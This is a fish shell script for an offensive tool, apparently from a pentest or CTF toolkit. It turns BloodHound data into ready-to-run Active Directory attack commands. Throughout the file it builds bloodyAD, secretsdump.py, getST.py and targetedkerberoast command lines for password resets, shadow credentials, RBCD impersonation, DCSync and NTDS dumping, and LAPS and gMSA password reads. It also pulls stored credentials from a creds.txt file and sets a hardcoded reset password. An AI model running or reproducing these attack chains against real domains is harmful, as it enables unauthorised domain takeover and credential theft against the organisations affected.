function __ezpz_path_print --argument-names command
    printf '%s\n' (__ezpz_cmd_format "$command")
end

function __ezpz_path_getst --argument-names base domain user secret hash dc spn target_user
    if test -n "$hash"
        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc -hashes '$hash' '$domain/$user'"
    else
        printf '%s\n' "getST.py -spn $spn -impersonate $target_user -dc-ip $dc '$domain/$user:$secret@$dc'"
    end
end

function __ezpz_path_secretsdump --argument-names domain user secret hash dc
    if test -n "$hash"
        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc -hashes '$hash' '$domain/$user@$dc'"
    else
        printf '%s\n' "secretsdump.py -just-dc -dc-ip $dc '$domain/$user:$secret@$dc'"
    end
end

function __ezpz_path_generic --argument-names base target target_type target_name user domain secret hash dc
    switch $target_type
        case User
            ezpz_cmd "Option 1: change password"
            __ezpz_path_print "$base set password $target '<NEWPASS>'"
            ezpz_cmd "Option 2: shadow credentials"
            __ezpz_path_print "$base add shadowCredentials $target"
        case Group
            __ezpz_path_print "$base add groupMember $target $user"
        case Computer
            ezpz_cmd "Option 1: shadow credentials"
            __ezpz_path_print "$base add shadowCredentials $target"
            ezpz_cmd "Option 2: RBCD + getST"
            __ezpz_path_print "$base add rbcd $target $user"
            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
        case Domain
            __ezpz_path_print "$base add dcsync $user"
            __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
        case '*'
            printf '%s\n' "No bloodyAD template for $target_type target."
    end
end


function __ezpz_path_secret --argument-names user domain
    set -l file creds.txt
    if set -q boxpwd; and test -f "$boxpwd/creds.txt"
        set file "$boxpwd/creds.txt"
    end
    test -f "$file"; or return

    while read -l line
        set line (string trim -- $line)
        test -z "$line"; and continue
        string match -q '#*' -- $line; and continue
        set -l parts (string split -m1 ':' -- $line)
        test (count $parts) -ge 2; or continue
        set -l identity $parts[1]
        set -l item_user $identity
        set -l item_domain ""
        if string match -q '*@*' -- $identity
            set item_user (string split -m1 '@' -- $identity)[1]
            set item_domain (string split -m1 '@' -- $identity)[2]
        else if string match -rq '\\\\' -- $identity
            set item_domain (string split -m1 '\\' -- $identity)[1]
            set item_user (string split -m1 '\\' -- $identity)[2]
        end
        test (string lower -- $item_user) = (string lower -- $user); or continue
        if test -n "$domain"; and test -n "$item_domain"; and test (string lower -- $item_domain) != (string lower -- $domain)
            continue
        end
        echo $parts[2]
        return
    end < "$file"
end

function __ezpz_path_hash --argument-names value
    if string match -qr '^[a-fA-F0-9]{32}$' -- $value
        echo ":$value"
        return 0
    else if string match -qr '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$' -- $value
        echo $value
        return 0
    else if string match -qr '^:[a-fA-F0-9]{32}$' -- $value
        echo $value
        return 0
    end
    return 1
end

function __ezpz_path_placeholder --argument-names user
    set -l name (string upper -- $user)
    set name (string replace -a -- '.' '_' $name)
    set name (string replace -a -- '-' '_' $name)
    set name (string replace -a -- '$' '' $name)
    printf '<%s_CRED>\n' "$name"
end

function __ezpz_path_render_edge --argument-names edge target target_type target_name user domain secret hash dc newpass
    set -l base_secret $secret
    if test -n "$hash"
        set base_secret $hash
    end
    set -l base "bloodyAD -H $dc -d $domain -u $user -p $base_secret"
    switch $edge
        case ForceChangePassword
            __ezpz_path_print "$base set password $target '$newpass'"
        case GenericAll AllExtendedRights WriteAllProperties
            __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$user" "$domain" "$secret" "$hash" "$dc"
        case GenericWrite
            switch $target_type
                case User
                    ezpz_cmd "Option 1: shadow credentials"
                    __ezpz_path_print "$base add shadowCredentials $target"
                    ezpz_cmd "Option 2: targeted Kerberoast"
                    if test -n "$hash"
                        __ezpz_path_print "targetedkerberoast -d $domain -H '$hash' --request-user $target"
                    else
                        __ezpz_path_print "targetedkerberoast -d $domain -u $user -p '$secret' --request-user $target"
                    end
                case Computer
                    ezpz_cmd "Option 1: shadow credentials"
                    __ezpz_path_print "$base add shadowCredentials $target"
                    ezpz_cmd "Option 2: RBCD + getST"
                    __ezpz_path_print "$base add rbcd $target $user"
                    __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
                case '*'
                    printf '%s\n' "No bloodyAD template for GenericWrite on $target_type target."
            end
        case WriteDacl
            if test "$target_type" = Domain
                ezpz_info "Step 1: grant DCSync"
                __ezpz_path_print "$base add dcsync $user"
                ezpz_info "Step 2: dump NTDS"
                __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
            else
                ezpz_info "Step 1: grant GenericAll"
                __ezpz_path_print "$base add genericAll $target $user"
                ezpz_info "Step 2: exploit GenericAll"
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$user" "$domain" "$secret" "$hash" "$dc"
            end
        case WriteOwner Owns
            ezpz_info "Step 1: take ownership"
            __ezpz_path_print "$base set owner $target $user"
            ezpz_info "Step 2: grant GenericAll"
            __ezpz_path_print "$base add genericAll $target $user"
            ezpz_info "Step 3: exploit GenericAll"
            __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$user" "$domain" "$secret" "$hash" "$dc"
        case AddMember AddSelf
            __ezpz_path_print "$base add groupMember $target $user"
        case DCSync GetChangesAll
            __ezpz_path_secretsdump "$domain" "$user" "$secret" "$hash" "$dc"
        case AddKeyCredentialLink
            __ezpz_path_print "$base add shadowCredentials $target"
        case ReadLAPSPassword
            __ezpz_path_print "$base get object $target --attr ms-Mcs-AdmPwd"
        case ReadGMSAPassword
            __ezpz_path_print "$base get object $target --attr msDS-ManagedPassword"
        case AllowedToAct
            ezpz_info "Step 1: configure RBCD"
            __ezpz_path_print "$base add rbcd $target $user"
            ezpz_info "Step 2: request service ticket"
            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
        case AllowedToDelegate
            __ezpz_path_getst "$base" "$domain" "$user" "$secret" "$hash" "$dc" "$target" "<IMPERSONATED_USER>"
    end
end

function _ezpz_path
    source "$EZPZ_HOME/functions/_ezpz_colors.fish"
    ezpz_banner path

    set -l usage "
Usage: ezpz path -u <user> -d <domain> [options]

Shows one-hop AD attack paths or a multihop chain from BloodHound data.

  -u, --user      Principal to analyze (required)
  -d, --domain    Domain used in generated commands (required)
  -f, --file      BloodHound zip (default: <domain>_bloodhound.zip)
  --chain         Search a multihop attack chain
  --to            Chain target (default: domain object; longest chain fallback)
  -h, --help      Show this help message
"

    argparse 'u/user=' 'f/file=' 'd/domain=' 'chain' 'to=' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    set -l source_user ""
    if set -q _flag_user
        set source_user $_flag_user
    end
    if test -z "$source_user"
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end
    if string match -q '*@*' -- $source_user; or string match -rq '\\\\' -- $source_user
        ezpz_error "Use a bare username in -u and pass the domain with -d/--domain."
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing required argument: -d/--domain"
        echo $usage
        return 1
    end
    set -l domain (string lower -- $_flag_domain)

    set -l zip_file ""
    if set -q _flag_file
        set zip_file $_flag_file
    else
        set zip_file (find . -maxdepth 1 -iname "$domain"_bloodhound.zip -type f 2>/dev/null | sort | tail -1)
    end
    if test -z "$zip_file"; or not test -f "$zip_file"
        ezpz_error "BloodHound zip not found for domain $domain. Use -f/--file or run enumdomain first."
        return 1
    end

    set -l helper "$EZPZ_HOME/utils/bloodhound_paths.py"
    if not test -f "$helper"
        ezpz_error "BloodHound path helper not found: $helper"
        return 1
    end

    set -l helper_args --zip "$zip_file" --from "$source_user"
    if set -q _flag_chain
        set -a helper_args --chain
        if set -q _flag_to
            set -a helper_args --to "$_flag_to"
        else
            set -a helper_args --fallback-longest
        end
    end
    set -l records (python3 "$helper" $helper_args 2>&1)
    set -l rc $status
    if test $rc -ne 0
        ezpz_error "$records"
        return 1
    end

    set -l paths
    set -l chain_steps
    set -l chain_source ""
    set -l chain_target ""
    set -l chain_target_type ""
    set -l chain_fallback_warning ""
    set -l chain_fallback_info ""
    for record in $records
        set -l fields (string split \t -- $record)
        switch "$fields[1]"
            case SOURCE
                set chain_source $fields[2]
            case TARGET
                set chain_target $fields[2]
                set chain_target_type $fields[3]
            case STEP
                set -a chain_steps $record
            case FALLBACK
                set chain_fallback_warning $fields[2]
                set chain_fallback_info $fields[3]
            case '*'
                set -a paths $record
        end
    end

    set -l dc (ezpz_dc_ip $domain)
    test -n "$dc"; or set dc "<DC>"

    set -l secret (__ezpz_path_secret "$source_user" "$domain" | head -1)
    set -l hash (__ezpz_path_hash "$secret")
    if test -n "$hash"
        set secret "<PASS>"
    else if test -z "$secret"
        set secret (__ezpz_path_placeholder "$source_user")
    end
    set -l base_secret $secret
    if test -n "$hash"
        set base_secret $hash
    end

    set -l base "bloodyAD -H $dc -d $domain -u $source_user -p $base_secret"

    if set -q _flag_chain
        if test (count $chain_steps) -eq 0
            printf '%s\n' "No attack chain found."
            echo
            ezpz_success "Done."
            return 0
        end
        set -l current_user $source_user
        set -l current_secret $secret
        set -l current_hash $hash
        set -l chain_path $chain_source
        for step_record in $chain_steps
            set -l fields (string split \t -- $step_record)
            set -a chain_path $fields[5]
        end
        if test -n "$chain_fallback_warning"
            ezpz_warn "$chain_fallback_warning $chain_fallback_info"
        end
        ezpz_header "Attack chain: "(string join ' -> ' $chain_path)
        set -l total_steps (count $chain_steps)
        set -l step_index 0
        for step_record in $chain_steps
            set -l fields (string split \t -- $step_record)
            set step_index (math $step_index + 1)
            set -l edge $fields[3]
            set -l step_source $fields[4]
            set -l step_target $fields[5]
            set -l step_type $fields[6]
            set -l step_dn $fields[7]
            set -l step_fqdn $fields[8]
            ezpz_title "$step_index: $step_source — $edge -> $step_target"
            __ezpz_path_render_edge "$edge" "$step_target" "$step_type" "$step_fqdn" "$current_user" "$domain" "$current_secret" "$current_hash" "$dc" "ezpzr0cks!"
            if test $step_index -lt $total_steps
                set -l next_secret ""
                if test "$edge" = ForceChangePassword
                    set next_secret "ezpzr0cks!"
                    set current_hash ""
                else
                    set next_secret (__ezpz_path_secret "$step_target" "$domain" | head -1)
                    set -l next_hash (__ezpz_path_hash "$next_secret")
                    if test -n "$next_hash"
                        set current_hash $next_hash
                        set next_secret "<PASS>"
                    else if test -z "$next_secret"
                        set next_secret (__ezpz_path_placeholder "$step_target")
                        set current_hash ""
                    else
                        set current_hash ""
                    end
                end
                set current_user $step_target
                set current_secret $next_secret
            end
        end
        echo
        ezpz_success "Done."
        return 0
    end

    ezpz_header "Attack paths for $source_user"
    if test (count $paths) -eq 0
        printf '%s\n' "No attack paths found."
        echo
        ezpz_success "Done."
        return 0
    end

    for record in $paths
        set -l fields (string split \t -- $record)
        set -l edge $fields[1]
        set -l target $fields[2]
        set -l target_type $fields[3]
        set -l target_dn $fields[4]
        set -l target_name $fields[5]
        set -l via $fields[6]
        if contains -- $target_type GPO OU CertTemplate Container
            continue
        end
        set -l label "$edge -> $target"
        if test -n "$via"
            set label "$label ($via)"
        end
        ezpz_title "$label"

        switch $edge
            case ForceChangePassword
                __ezpz_path_print "$base set password $target '<NEWPASS>'"
            case GenericAll AllExtendedRights WriteAllProperties
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
            case GenericWrite
                switch $target_type
                    case User
                        ezpz_cmd "Option 1: shadow credentials"
                        __ezpz_path_print "$base add shadowCredentials $target"
                        ezpz_cmd "Option 2: targeted Kerberoast"
                        if test -n "$hash"
                            __ezpz_path_print "targetedkerberoast -d $domain -H '$hash' --request-user $target"
                        else
                            __ezpz_path_print "targetedkerberoast -d $domain -u $source_user -p '$secret' --request-user $target"
                        end
                    case Computer
                        ezpz_cmd "Option 1: shadow credentials"
                        __ezpz_path_print "$base add shadowCredentials $target"
                        ezpz_cmd "Option 2: RBCD + getST"
                        __ezpz_path_print "$base add rbcd $target $source_user"
                        __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
                    case '*'
                        printf '%s\n' "No bloodyAD template for GenericWrite on $target_type target."
                end
            case WriteDacl
                if test "$target_type" = Domain
                    __ezpz_path_print "$base add dcsync $source_user"
                    __ezpz_path_secretsdump "$domain" "$source_user" "$secret" "$hash" "$dc"
                else
                    ezpz_info "Step 1: grant GenericAll"
                    __ezpz_path_print "$base add genericAll $target $source_user"
                    ezpz_info "Step 2: exploit GenericAll"
                    __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
                end
            case WriteOwner Owns
                ezpz_info "Step 1: take ownership"
                __ezpz_path_print "$base set owner $target $source_user"
                ezpz_info "Step 2: grant GenericAll"
                __ezpz_path_print "$base add genericAll $target $source_user"
                ezpz_info "Step 3: exploit GenericAll"
                __ezpz_path_generic "$base" "$target" "$target_type" "$target_name" "$source_user" "$domain" "$secret" "$hash" "$dc"
            case AddMember AddSelf
                __ezpz_path_print "$base add groupMember $target $source_user"
            case DCSync GetChangesAll
                __ezpz_path_secretsdump "$domain" "$source_user" "$secret" "$hash" "$dc"
            case AddKeyCredentialLink
                __ezpz_path_print "$base add shadowCredentials $target"
            case ReadLAPSPassword
                __ezpz_path_print "$base get object $target --attr ms-Mcs-AdmPwd"
            case ReadGMSAPassword
                __ezpz_path_print "$base get object $target --attr msDS-ManagedPassword"
            case AllowedToAct
                ezpz_info "Step 1: configure RBCD"
                __ezpz_path_print "$base add rbcd $target $source_user"
                ezpz_info "Step 2: request service ticket"
                __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "cifs/$target_name" "<IMPERSONATED_USER>"
            case AllowedToDelegate
                __ezpz_path_getst "$base" "$domain" "$source_user" "$secret" "$hash" "$dc" "$target" "<IMPERSONATED_USER>"
            case '*'
                continue
        end
    end

    echo
    ezpz_success "Done."
end
